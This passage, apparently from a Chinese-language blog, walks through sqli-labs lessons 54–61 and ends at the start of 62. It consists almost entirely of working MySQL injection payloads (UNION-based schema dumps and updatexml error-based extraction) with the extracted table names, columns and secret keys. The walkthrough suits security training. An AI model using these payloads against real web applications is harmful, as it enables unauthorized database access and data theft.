<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>找到信息</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">[ challenges ] &gt; T7AX15TTDL &gt; id<span class="hljs-string">|</span><br>[ challenges ] &gt; T7AX15TTDL &gt; sessid<span class="hljs-string">|</span><br>[ challenges ] &gt; T7AX15TTDL &gt; secret_NB98<span class="hljs-string">|</span><br>[ challenges ] &gt; T7AX15TTDL &gt; tryy<span class="hljs-string">|</span><br></code></pre></td></tr></table></figure>



<p>再次使用超级payload</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (challenges.T7AX15TTDL) <span class="hljs-keyword">where</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,secret_NB98,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,tryy,<span class="hljs-string">&#x27; &gt; &#x27;</span>,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121154651410.png" srcset="/img/loading.gif" lazyload alt="image-20210121154651410"></p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">00</span>QTSD<span class="hljs-number">2</span><span class="hljs-symbol">NrEA450</span>P<span class="hljs-number">4</span>Dx<span class="hljs-number">0</span>Ebl<span class="hljs-number">68</span><br></code></pre></td></tr></table></figure>

<p>成功</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121154726007.png" srcset="/img/loading.gif" lazyload alt="image-20210121154726007"></p>
<h2 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h2><p> 一样的，找key</p>
<p>闭合</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1)%23<br></code></pre></td></tr></table></figure>

<p>报表、字段</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?id=<span class="hljs-number">0</span>) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) from (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) from (information_schema.columns) where (table_schema&gt;=@) and (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%23<br></code></pre></td></tr></table></figure>

<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">[ challenges ] &gt; F9CD4IEXCM &gt; id<span class="hljs-string">|</span><br>[ challenges ] &gt; F9CD4IEXCM &gt; sessid<span class="hljs-string">|</span><br>[ challenges ] &gt; F9CD4IEXCM &gt; secret_XYU3<span class="hljs-string">|</span><br>[ challenges ] &gt; F9CD4IEXCM &gt; tryy<span class="hljs-string">|</span><br></code></pre></td></tr></table></figure>

<p>爆key</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?id=<span class="hljs-number">0</span>) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) from (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) from (challenges.F9CD4IEXCM) where (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,secret_XYU3,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,tryy,<span class="hljs-string">&#x27; &gt; &#x27;</span>,<span class="hljs-number">0x7C</span>))))a)%23<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121155207034.png" srcset="/img/loading.gif" lazyload alt="image-20210121155207034"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">66ochPNMZSpRBWYs6isAniPu <br></code></pre></td></tr></table></figure>



<h2 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h2><p>闭合</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;)<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<p>爆表和字段</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span>) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">[ challenges ] &gt; <span class="hljs-number">4</span>CGK8MNQEA &gt; id<span class="hljs-string">|</span><br>[ challenges ] &gt; <span class="hljs-number">4</span>CGK8MNQEA &gt; sessid<span class="hljs-string">|</span><br>[ challenges ] &gt; <span class="hljs-number">4</span>CGK8MNQEA &gt; secret_9O3N<span class="hljs-string">|</span><br>[ challenges ] &gt; <span class="hljs-number">4</span>CGK8MNQEA &gt; tryy<span class="hljs-string">|</span><br></code></pre></td></tr></table></figure>

<p>爆key</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span>) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (challenges<span class="hljs-number">.4</span>CGK8MNQEA) <span class="hljs-keyword">where</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,secret_9O3N,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,tryy,<span class="hljs-string">&#x27; &gt; &#x27;</span>,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121155715020.png" srcset="/img/loading.gif" lazyload alt="image-20210121155715020"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">CivPbcRci7gkyld4mT8yk6K7<br></code></pre></td></tr></table></figure>



<h2 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h2><p>闭合</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;%23<br></code></pre></td></tr></table></figure>
<p>爆表和字段</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=0&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (information_schema.columns) <span class="hljs-keyword">where</span> (table_schema&gt;=@) <span class="hljs-keyword">and</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,table_schema,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="hljs-string">&#x27; &gt; &#x27;</span>,column_name,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">[ challenges ] &gt; IAZ0INFM54 &gt; id<span class="hljs-string">|</span><br>[ challenges ] &gt; IAZ0INFM54 &gt; sessid<span class="hljs-string">|</span><br>[ challenges ] &gt; IAZ0INFM54 &gt; secret_OPLK<span class="hljs-string">|</span><br>[ challenges ] &gt; IAZ0INFM54 &gt; tryy<span class="hljs-string">|</span><br></code></pre></td></tr></table></figure>

<p>爆key</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=0&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span>(@:=<span class="hljs-number">0x00</span>),(<span class="hljs-keyword">select</span> (@) <span class="hljs-keyword">from</span> (challenges.IAZ0INFM54) <span class="hljs-keyword">where</span> (@)<span class="hljs-keyword">in</span> (@:=concat(@,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-string">&#x27; [ &#x27;</span>,secret_OPLK,<span class="hljs-string">&#x27; ] &gt; &#x27;</span>,tryy,<span class="hljs-string">&#x27; &gt; &#x27;</span>,<span class="hljs-number">0x7C</span>))))a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121160120151.png" srcset="/img/loading.gif" lazyload alt="image-20210121160120151"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">COwmHaOTl7yQlbqef4fNntlx<br></code></pre></td></tr></table></figure>



<h2 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h2><p>闭合</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>



<p>union select 的值出乎所料</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121160531439.png" srcset="/img/loading.gif" lazyload alt="image-20210121160531439"></p>
<p>但是报错还是会的</p>
<p>所以用报错注入</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">?id=<span class="hljs-number">0</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-built_in">select</span> <span class="hljs-built_in">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121170446791.png" srcset="/img/loading.gif" lazyload alt="image-20210121170446791"></p>
<p>爆出表名</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">?id=<span class="hljs-number">0</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121171127295.png" srcset="/img/loading.gif" lazyload alt="image-20210121171127295"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">4Z1LZW5DB9<br></code></pre></td></tr></table></figure>



<p>爆出字段名</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-function">AND <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;4Z1LZW5DB9&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121171340552.png" srcset="/img/loading.gif" lazyload alt="image-20210121171340552"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">secret_0ICC<br></code></pre></td></tr></table></figure>

<p>爆出要的数据</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=0&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(secret_0ICC) <span class="hljs-keyword">from</span> <span class="hljs-symbol">`4Z1LZW5DB9`</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121171641645.png" srcset="/img/loading.gif" lazyload alt="image-20210121171641645"></p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">alKM<span class="hljs-symbol">NGS3</span>OPtJlcDZ<span class="hljs-number">05</span>HkP<span class="hljs-number">0</span><span class="hljs-symbol">NH</span><br></code></pre></td></tr></table></figure>

<p>最后看了看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$unames</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Dumb&quot;</span>,<span class="hljs-string">&quot;Angelina&quot;</span>,<span class="hljs-string">&quot;Dummy&quot;</span>,<span class="hljs-string">&quot;secure&quot;</span>,<span class="hljs-string">&quot;stupid&quot;</span>,<span class="hljs-string">&quot;superman&quot;</span>,<span class="hljs-string">&quot;batman&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin1&quot;</span>,<span class="hljs-string">&quot;admin2&quot;</span>,<span class="hljs-string">&quot;admin3&quot;</span>,<span class="hljs-string">&quot;dhakkan&quot;</span>,<span class="hljs-string">&quot;admin4&quot;</span>);<br><span class="hljs-variable">$pass</span> = (<span class="hljs-variable">$unames</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name : &#x27;</span>. <span class="hljs-variable">$unames</span>[<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password : &#x27;</span> .<span class="hljs-variable">$pass</span>[<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]];<br></code></pre></td></tr></table></figure>

<p>id只是作为数组的索引而已，怪不得没有想要的东西回显</p>
<h2 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h2><p>闭合</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1%23<br></code></pre></td></tr></table></figure>

<p>爆出表名</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121172236744.png" srcset="/img/loading.gif" lazyload alt="image-20210121172236744"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">881IWOX5RE<br></code></pre></td></tr></table></figure>

<p>爆出字段名</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;881IWOX5RE&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121172336841.png" srcset="/img/loading.gif" lazyload alt="image-20210121172336841"></p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">secret_UPSN</span><br></code></pre></td></tr></table></figure>



<p>爆出数据</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0</span>x7e,(<span class="hljs-keyword">select</span> group_concat(secret_UPSN) <span class="hljs-keyword">from</span> `<span class="hljs-number">881</span>IWOX5RE`),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121172607215.png" srcset="/img/loading.gif" lazyload alt="image-20210121172607215"></p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">7</span>KBs<span class="hljs-number">5</span>lsx<span class="hljs-number">2</span><span class="hljs-meta">O03</span>oqzMhxJSBwrp<br></code></pre></td></tr></table></figure>



<h2 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h2><p>闭合</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;)%23<br></code></pre></td></tr></table></figure>

<p>表名</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">H<span class="hljs-number">0</span><span class="hljs-symbol">NBLL5</span>CGP<br></code></pre></td></tr></table></figure>

<p>字段名</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;) union select 1,2,3 <span class="hljs-keyword">AND</span> updatexml(1,concat(0x7e,(select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;H0NBLL5CGP&#x27;</span>),0x7e),1)%23<br></code></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">secret_8RQ5<br></code></pre></td></tr></table></figure>

<p>key</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(secret_8RQ5) <span class="hljs-keyword">from</span> <span class="hljs-symbol">`H0NBLL5CGP`</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">rDktDmwezZTBsJMuXYdvbwGT</span><br></code></pre></td></tr></table></figure>



<h2 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h2><p>闭合</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;))<span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<p>表名</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">?id=<span class="hljs-number">1</span>&#x27;)) <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">U76MT1471B<br></code></pre></td></tr></table></figure>

<p>字段</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">1&#x27;</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-function">AND <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;U76MT1471B&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">secret_Y380<br></code></pre></td></tr></table></figure>

<p>key</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&#x27;)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(secret_Y380) <span class="hljs-keyword">from</span> <span class="hljs-symbol">`U76MT1471B`</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">Q0AkPbVJH0TwTF8CIi7B2gwt<br></code></pre></td></tr></table></figure>





<h2 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h2><p>闭合</p>
